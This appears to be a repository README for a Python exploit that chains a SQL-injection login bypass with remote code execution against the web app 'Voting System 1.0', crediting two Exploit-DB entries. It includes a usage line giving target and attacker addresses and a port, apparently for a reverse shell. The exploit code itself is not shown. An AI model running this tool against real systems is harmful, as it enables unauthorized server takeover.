# Voting-System-1.0-Unauth-RCE
Voting System 1.0 Unauth RCE

A python 3 script to get an Unauth RCE on the webapp voting system 1.0. All credit and most of the script goes to:

Richard Jones
https://www.exploit-db.com/exploits/49445

Secure77
https://www.exploit-db.com/exploits/49843

I just modified it to chain the SQLI Auth bypass and Auth RCE together

Example:
python exploit.py -t 10.1.1.234 -i 10.2.1.5 -r 4444
